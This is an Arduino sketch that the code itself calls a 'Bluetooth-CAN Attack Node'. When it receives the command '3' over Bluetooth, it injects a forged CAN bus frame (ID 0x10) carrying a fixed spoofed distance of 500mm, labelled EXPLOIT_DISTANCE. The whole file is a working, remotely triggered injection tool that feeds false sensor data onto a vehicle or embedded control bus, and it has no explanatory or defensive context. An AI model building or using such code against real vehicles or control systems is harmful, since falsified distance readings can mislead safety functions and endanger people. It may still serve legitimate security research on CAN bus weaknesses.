#include <SoftwareSerial.h>  // Bluetooth Serial
#include <CAN.h>             // Native CAN library for built-in CAN controllers

// Bluetooth communication pins
SoftwareSerial BT(10, 11); // TX, RX for Bluetooth module

// Constants
const int LED_PIN = 13;               // LED control pin
const long CAN_SPEED = 500E3;
const long g_canID = 0x10;             // CAN ID for attack message
const uint16_t EXPLOIT_DISTANCE = 500; // Fixed attack distance (500mm)

// Globals
bool g_canActive = false;

void initCAN();
void sendDistanceOverCAN(uint16_t distance);

void setup() {
  pinMode(LED_PIN, OUTPUT);  // Set LED pin as output
  digitalWrite(LED_PIN, LOW); // Start with LED off
  
  BT.begin(9600);      // Start Bluetooth module
  Serial.begin(115200); // Debugging via Serial Monitor

  Serial.println("Bluetooth-CAN Attack Node Ready");
  BT.println("Send '3' to inject fixed distance message (500mm)");

  initCAN(); // Initialize CAN
}

void loop() {
  // Check for Bluetooth input
  if (BT.available()) {
    char command;
    command = BT.read();

    if (command == '3') {
      digitalWrite(LED_PIN, HIGH); // Turn LED ON before sending
      Serial.println("Injecting CAN Message...");
      sendDistanceOverCAN(EXPLOIT_DISTANCE);
      digitalWrite(LED_PIN, LOW); // Turn LED OFF after sending
      BT.println("CAN message sent (500mm).");
    } else {
      BT.println("Unknown command. Send '3' to trigger.");
    }
  }

  // Ensure CAN is always active
  if (!g_canActive) {
    initCAN();
  }
}

void initCAN() {
  if (!CAN.begin(CAN_SPEED)) {
    Serial.println("Starting CAN failed!");
    g_canActive = false;
  } else {
    Serial.println("CAN started successfully");
    g_canActive = true;
  }
}

void sendDistanceOverCAN(uint16_t distance) {
  byte canData[2] = {0};
  canData[0] = distance & 0xFF;        // LSB of distance
  canData[1] = (distance >> 8) & 0xFF; // MSB of distance

  if (!CAN.beginPacket(g_canID)) {
    Serial.println("CAN begin failed");
    g_canActive = false;
  } else {
    CAN.write(canData, 2);
    CAN.endPacket();
    Serial.println("CAN packet sent successfully");
    Serial.print("Sent Data: [0x");
    Serial.print(canData[0], HEX);
    Serial.print(", 0x");
    Serial.print(canData[1], HEX);
    Serial.println("]");
  }
}
